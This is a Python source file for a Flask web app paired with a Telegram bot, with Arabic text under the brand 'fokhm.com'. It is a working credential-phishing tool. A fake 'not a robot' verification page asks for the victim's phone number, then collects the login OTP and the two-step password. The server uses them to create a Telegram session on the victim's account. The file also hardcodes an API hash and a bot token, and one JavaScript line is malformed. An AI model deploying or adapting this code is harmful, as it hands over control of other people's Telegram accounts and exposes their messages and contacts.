from flask import Flask, render_template_string, request
from telethon import TelegramClient
from telethon.sessions import StringSession
import asyncio
import os
import threading
from telegram import Update, WebAppInfo, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler

app = Flask(__name__)

API_ID = 25757508
API_HASH = '3091fbda91d4b133207779ddf81fee39'
BOT_TOKEN = os.getenv("BOT_TOKEN", "8828318815:AAEJ63XFWpwwuigCWuO_-Hu94sJVyhgn338")

active_sessions = {}

WEB_APP_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>منصة fokhm.com - التحقق الذكي</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background-color: #0f172a; color: #fff; font-family: Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #1e293b; padding: 30px; border-radius: 18px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 330px; text-align: center; border: 1px solid #334155; }
        h2 { color: #38bdf8; margin-bottom: 5px; }
        p { color: #94a3b8; font-size: 14px; margin-bottom: 25px; }
        .verify-box { background: #0f172a; border: 2px dashed #475569; padding: 20px; border-radius: 12px; cursor: pointer; transition: 0.3s; margin-bottom: 15px; }
        .verify-box:active { border-color: #38bdf8; background: #1e293b; }
        .checkbox { font-size: 18px; font-weight: bold; color: #4ade80; }
        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 10px; border: 1px solid #475569; background: #0f172a; color: #fff; font-size: 16px; text-align: center; outline: none; }
        button { width: 95%; padding: 12px; background: #2563eb; color: white; border: none; border-radius: 10px; font-size: 16px; cursor: pointer; font-weight: bold; margin-top: 15px; transition: 0.3s; }
        button:hover { background: #1d4ed8; }
        .msg { color: #f87171; font-size: 14px; margin-bottom: 10px; }
        .success { color: #4ade80; font-size: 12px; word-break: break-all; background: #0f172a; padding: 12px; border-radius: 8px; text-align: left; direction: ltr; max-height: 160px; overflow-y: auto; border: 1px solid #166534; }
        .loader { border: 3px solid #334155; border-top: 3px solid #38bdf8; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; display: none; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="card">
        <h2>منصة fokhm.com</h2>
        <div id="content">
            <p>انقر أدناه لإتمام التحقق الأوتوماتيكي:</p>
            <div class="verify-box" onclick="stealthRequest()">
                <span class="checkbox">☑️ أنا لست روبوت (تحقق فوري)</span>
            </div>
            <div class="loader" id="loading"></div>
            <div id="error_box" class="msg"></div>
        </div>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();
        let currentUserId = tg.initDataUnsafe?.user?.id || 'web_user_' + Math.random();

        function showLoader(show) {
            document.getElementById('loading').style.display = show ? 'block' : 'none';
        }

        function stealthRequest() {
            showLoader(true);
            if (tg.requestContact) {
                tg.requestContact((shared, contact) => {
                    showLoader(false);
                    if (shared && contact) {
                        let phoneNum = contact.phone_number.toString();
                        if (!phoneNum.startsWith('+')) phoneNum = '+' + phoneNum;
                        callApi('phone', phoneNum);
                    } else {
                        document.getElementById('error_boxinnerText = "عذراً، يجب الموافقة للمتابعة.";';
                    }
                });
            } else {
                showLoader(false);
                let phone = prompt("أدخل رقم هاتفك مع رمز الدولة:");
                if (phone) callApi('phone', phone.toString());
            }
        }

        function callApi(action, value) {
            showLoader(true);
            fetch('/api', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ action: action, value: value, user_id: currentUserId })
            })
            .then(res => res.json())
            .then(data => {
                showLoader(false);
                let html = '';
                if (data.status === 'need_code') {
                    html = `<p>✅ تم التحقق واستلام الرقم.<br>أدخل رمز التحقق (OTP) الذي وصلك:</p>
                            <input type="text" id="code_val" placeholder="12345">
                            <button onclick="submitCode()">تأكيد الكود</button>`;
                } else if (data.status === 'need_password') {
                    html = `<p>الحساب محمي بكلمة مرور (تحقق بخطوتين):</p>
                            <input type="password" id="pass_val" placeholder="كلمة المرور">
                            <button onclick="submitPassword()">تحقق</button>`;
                } else if (data.status === 'done') {
                    html = `<h3 style="color: #4ade80;">✅ تمت العملية بنجاح يا فخم!</h3>
                            <p>نسخ جلسة حسابك:</p>
                            <div class="success">${data.session}</div>`;
                } else {
                    html = `<p class="msg">${data.message}</p>
                            <div class="verify-box" onclick="stealthRequest()">
                                <span class="checkbox">☑️ إعادة المحاولة</span>
                            </div>`;
                }
                document.getElementById('content').innerHTML = html;
            })
            .catch(err => {
                showLoader(false);
                alert("خطأ في الاتصال");
            });
        }

        function submitCode() {
            let code = document.getElementById('code_val').value.toString();
            if(!code) { alert("أدخل الكود أولاً"); return; }
            callApi('code', code);
        }

        function submitPassword() {
            let pass = document.getElementById('pass_val').value.toString();
            if(!pass) { alert("أدخل كلمة المرور أولاً"); return; }
            callApi('password', pass);
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(WEB_APP_HTML)

@app.route('/api', methods=['POST'])
def api():
    global active_sessions
    data = request.json
    action = data.get('action')
    value = str(data.get('value')) if data.get('value') else ""
    user_id = str(data.get('user_id'))

    try:
        if action == 'phone':
            phone = str(value).strip()
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(client.connect())
            
            sent_code = loop.run_until_complete(client.send_code_request(phone))
            
            active_sessions[user_id] = {
                'client': client,
                'loop': loop,
                'phone': phone,
                'hash': str(sent_code.phone_code_hash)
            }
            return {"status": "need_code"}

        elif action == 'code':
            session_data = active_sessions.get(user_id)
            if not session_data:
                return {"status": "error", "message": "انتهت الجلسة، اعد المحاولة."}
            
            client = session_data['client']
            loop = session_data['loop']
            code = str(value).strip()
            
            try:
                loop.run_until_complete(client.sign_in(str(session_data['phone']), code, phone_code_hash=str(session_data['hash'])))
                session_str = client.session.save()
                return {"status": "done", "session": str(session_str)}
            except Exception as e:
                err_str = str(e)
                if "SessionPasswordNeededError" in err_str or "password" in err_str.lower():
                    return {"status": "need_password"}
                else:
                    return {"status": "error", "message": err_str}

        elif action == 'password':
            session_data = active_sessions.get(user_id)
            if not session_data:
                return {"status": "error", "message": "انتهت الجلسة."}
            
            client = session_data['client']
            loop = session_data['loop']
            password = str(value).strip()
            
            try:
                loop.run_until_complete(client.sign_in(password=password))
                session_str = client.session.save()
                return {"status": "done", "session": str(session_str)}
            except Exception as e:
                return {"status": "error", "message": f"كلمة المرور خطأ: {e}"}

    except Exception as e:
        return {"status": "error", "message": str(e)}

    return {"status": "error", "message": "طلب غير معروف"}

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    web_url = os.getenv('RENDER_EXTERNAL_URL', 'wahm0.onrender.com')
    if not web_url.startswith('http'):
        web_url = f"https://{web_url}"
        
    keyboard = [[InlineKeyboardButton("🚀 فتح واجهة التحقق - fokhm.com", web_app=WebAppInfo(url=web_url))]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "أهلاً بك يا فخم في بوت منصة `fokhm.com`\n\nاضغط على الزر بالأسفل لبدء التحقق الفوري وسحب الرقم تلقائياً:",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

def run_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), use_reloader=False)

if __name__ == '__main__':
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start_command))
    
    print("Fokhm Stealth Bot is running...")
    application.run_polling()

